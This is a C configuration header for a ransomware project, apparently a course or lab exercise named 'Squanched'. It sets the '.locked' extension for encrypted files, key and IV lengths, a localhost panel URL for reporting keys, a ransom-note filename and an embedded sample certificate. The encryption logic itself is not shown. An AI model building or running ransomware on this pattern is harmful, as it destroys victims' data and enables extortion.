#pragma once
/*
* Extension for all locked files
*/
#define LOCKED_EXTENSION ".locked"

/*
* Key length in bytes, default is 32 (256 bits)
*/
#define KEY_LEN (256/8) // 256 bits

/*
* URL to add.php
*/
#define URL_PANEL "http://localhost/add.php"

/*
* If notification file should be created
*/
#define OPEN_FILE true

/*
* Notification file name
*/
#define NOTIFY_FILENAME "note.html"

#define IV_LEN (128/8)

/*
 * Num of digits to represent IV size in bytes
 */
#define IV_DIGITS_NUM 2


#define ENC

#define ID_LEN (256/8) // 256 bits
/*
 * Certifcate
 */

#define CERT "Certificate:\n\
    Data:\n\
        Version: 3 (0x2)\n\
        Serial Number:\n\
            b7:b6:90:33:66:1b:6b:23\n\
    Signature Algorithm: sha256WithRSAEncryption\n\
        Issuer: C=US, ST=Montana, L=Bozeman, O=Sawtooth, OU=Consulting, CN=www.wolfssl.com/emailAddress=info@wolfssl.com\n\
        Validity\n\
            Not Before: Aug 11 20:07:37 2016 GMT\n\
            Not After : May  8 20:07:37 2019 GMT\n\
        Subject: C=US, ST=Montana, L=Bozeman, O=Sawtooth, OU=Consulting, CN=www.wolfssl.com/emailAddress=info@wolfssl.com\n\
        Subject Public Key Info:\n\
            Public Key Algorithm: rsaEncryption\n\
                Public-Key: (2048 bit)\n\
                Modulus:\n\
                    00:bf:0c:ca:2d:14:b2:1e:84:42:5b:cd:38:1f:4a:\n\
                    f2:4d:75:10:f1:b6:35:9f:df:ca:7d:03:98:d3:ac:\n\
                    de:03:66:ee:2a:f1:d8:b0:7d:6e:07:54:0b:10:98:\n\
                    21:4d:80:cb:12:20:e7:cc:4f:de:45:7d:c9:72:77:\n\
                    32:ea:ca:90:bb:69:52:10:03:2f:a8:f3:95:c5:f1:\n\
                    8b:62:56:1b:ef:67:6f:a4:10:41:95:ad:0a:9b:e3:\n\
                    a5:c0:b0:d2:70:76:50:30:5b:a8:e8:08:2c:7c:ed:\n\
                    a7:a2:7a:8d:38:29:1c:ac:c7:ed:f2:7c:95:b0:95:\n\
                    82:7d:49:5c:38:cd:77:25:ef:bd:80:75:53:94:3c:\n\
                    3d:ca:63:5b:9f:15:b5:d3:1d:13:2f:19:d1:3c:db:\n\
                    76:3a:cc:b8:7d:c9:e5:c2:d7:da:40:6f:d8:21:dc:\n\
                    73:1b:42:2d:53:9c:fe:1a:fc:7d:ab:7a:36:3f:98:\n\
                    de:84:7c:05:67:ce:6a:14:38:87:a9:f1:8c:b5:68:\n\
                    cb:68:7f:71:20:2b:f5:a0:63:f5:56:2f:a3:26:d2:\n\
                    b7:6f:b1:5a:17:d7:38:99:08:fe:93:58:6f:fe:c3:\n\
                    13:49:08:16:0b:a7:4d:67:00:52:31:67:23:4e:98:\n\
                    ed:51:45:1d:b9:04:d9:0b:ec:d8:28:b3:4b:bd:ed:\n\
                    36:79\n\
                Exponent: 65537 (0x10001)\n\
        X509v3 extensions:\n\
            X509v3 Subject Key Identifier: \n\
                27:8E:67:11:74:C3:26:1D:3F:ED:33:63:B3:A4:D8:1D:30:E5:E8:D5\n\
            X509v3 Authority Key Identifier: \n\
                keyid:27:8E:67:11:74:C3:26:1D:3F:ED:33:63:B3:A4:D8:1D:30:E5:E8:D5\n\
                DirName:/C=US/ST=Montana/L=Bozeman/O=Sawtooth/OU=Consulting/CN=www.wolfssl.com/emailAddress=info@wolfssl.com\n\
                serial:B7:B6:90:33:66:1B:6B:23\n\
\n\
            X509v3 Basic Constraints: \n\
                CA:TRUE\n\
    Signature Algorithm: sha256WithRSAEncryption\n\
         0e:93:48:44:4a:72:96:60:71:25:82:a9:2c:ca:60:5b:f2:88:\n\
         3e:cf:11:74:5a:11:4a:dc:d9:d8:f6:58:2c:05:d3:56:d9:e9:\n\
         8f:37:ef:8e:3e:3b:ff:22:36:00:ca:d8:e2:96:3f:a7:d1:ed:\n\
         1f:de:7a:b0:d7:8f:36:bd:41:55:1e:d4:b9:86:3b:87:25:69:\n\
         35:60:48:d6:e4:5a:94:ce:a2:fa:70:38:36:c4:85:b4:4b:23:\n\
         fe:71:9e:2f:db:06:c7:b5:9c:21:f0:3e:7c:eb:91:f8:5c:09:\n\
         fd:84:43:a4:b3:4e:04:0c:22:31:71:6a:48:c8:ab:bb:e8:ce:\n\
         fa:67:15:1a:3a:82:98:43:33:b5:0e:1f:1e:89:f8:37:de:1b:\n\
         e6:b5:a0:f4:a2:8b:b7:1c:90:ba:98:6d:94:21:08:80:5d:f3:\n\
         bf:66:ad:c9:72:28:7a:6a:48:ee:cf:63:69:31:8c:c5:8e:66:\n\
         da:4b:78:65:e8:03:3a:4b:f8:cc:42:54:d3:52:5c:2d:04:ae:\n\
         26:87:e1:7e:40:cb:45:41:16:4b:6e:a3:2e:4a:76:bd:29:7f:\n\
         1c:53:37:06:ad:e9:5b:6a:d6:b7:4e:94:a2:7c:e8:ac:4e:a6:\n\
         50:3e:2b:32:9e:68:42:1b:e4:59:67:61:ea:c7:9a:51:9c:1c:\n\
         55:a3:77:76\n\
-----BEGIN CERTIFICATE-----\n\
MIIEqjCCA5KgAwIBAgIJALe2kDNmG2sjMA0GCSqGSIb3DQEBCwUAMIGUMQswCQYD\n\
VQQGEwJVUzEQMA4GA1UECAwHTW9udGFuYTEQMA4GA1UEBwwHQm96ZW1hbjERMA8G\n\
A1UECgwIU2F3dG9vdGgxEzARBgNVBAsMCkNvbnN1bHRpbmcxGDAWBgNVBAMMD3d3\n\
dy53b2xmc3NsLmNvbTEfMB0GCSqGSIb3DQEJARYQaW5mb0B3b2xmc3NsLmNvbTAe\n\
Fw0xNjA4MTEyMDA3MzdaFw0xOTA1MDgyMDA3MzdaMIGUMQswCQYDVQQGEwJVUzEQ\n\
MA4GA1UECAwHTW9udGFuYTEQMA4GA1UEBwwHQm96ZW1hbjERMA8GA1UECgwIU2F3\n\
dG9vdGgxEzARBgNVBAsMCkNvbnN1bHRpbmcxGDAWBgNVBAMMD3d3dy53b2xmc3Ns\n\
LmNvbTEfMB0GCSqGSIb3DQEJARYQaW5mb0B3b2xmc3NsLmNvbTCCASIwDQYJKoZI\n\
hvcNAQEBBQADggEPADCCAQoCggEBAL8Myi0Ush6EQlvNOB9K8k11EPG2NZ/fyn0D\n\
mNOs3gNm7irx2LB9bgdUCxCYIU2AyxIg58xP3kV9yXJ3MurKkLtpUhADL6jzlcXx\n\
i2JWG+9nb6QQQZWtCpvjpcCw0nB2UDBbqOgILHztp6J6jTgpHKzH7fJ8lbCVgn1J\n\
XDjNdyXvvYB1U5Q8PcpjW58VtdMdEy8Z0TzbdjrMuH3J5cLX2kBv2CHccxtCLVOc\n\
/hr8fat6Nj+Y3oR8BWfOahQ4h6nxjLVoy2h/cSAr9aBj9VYvoybSt2+xWhfXOJkI\n\
/pNYb/7DE0kIFgunTWcAUjFnI06Y7VFFHbkE2Qvs2CizS73tNnkCAwEAAaOB/DCB\n\
+TAdBgNVHQ4EFgQUJ45nEXTDJh0/7TNjs6TYHTDl6NUwgckGA1UdIwSBwTCBvoAU\n\
J45nEXTDJh0/7TNjs6TYHTDl6NWhgZqkgZcwgZQxCzAJBgNVBAYTAlVTMRAwDgYD\n\
VQQIDAdNb250YW5hMRAwDgYDVQQHDAdCb3plbWFuMREwDwYDVQQKDAhTYXd0b290\n\
aDETMBEGA1UECwwKQ29uc3VsdGluZzEYMBYGA1UEAwwPd3d3LndvbGZzc2wuY29t\n\
MR8wHQYJKoZIhvcNAQkBFhBpbmZvQHdvbGZzc2wuY29tggkAt7aQM2YbayMwDAYD\n\
VR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEADpNIREpylmBxJYKpLMpgW/KI\n\
Ps8RdFoRStzZ2PZYLAXTVtnpjzfvjj47/yI2AMrY4pY/p9HtH956sNePNr1BVR7U\n\
uYY7hyVpNWBI1uRalM6i+nA4NsSFtEsj/nGeL9sGx7WcIfA+fOuR+FwJ/YRDpLNO\n\
BAwiMXFqSMiru+jO+mcVGjqCmEMztQ4fHon4N94b5rWg9KKLtxyQuphtlCEIgF3z\n\
v2atyXIoempI7s9jaTGMxY5m2kt4ZegDOkv4zEJU01JcLQSuJofhfkDLRUEWS26j\n\
Lkp2vSl/HFM3Bq3pW2rWt06UonzorE6mUD4rMp5oQhvkWWdh6seaUZwcVaN3dg==\n\
-----END CERTIFICATE-----"

//#ifdef DEBUG
#define ROOT_DIR R"(C:\Programming\RansomWare\236499\Squanched\Debug\testDir)"
//#endif



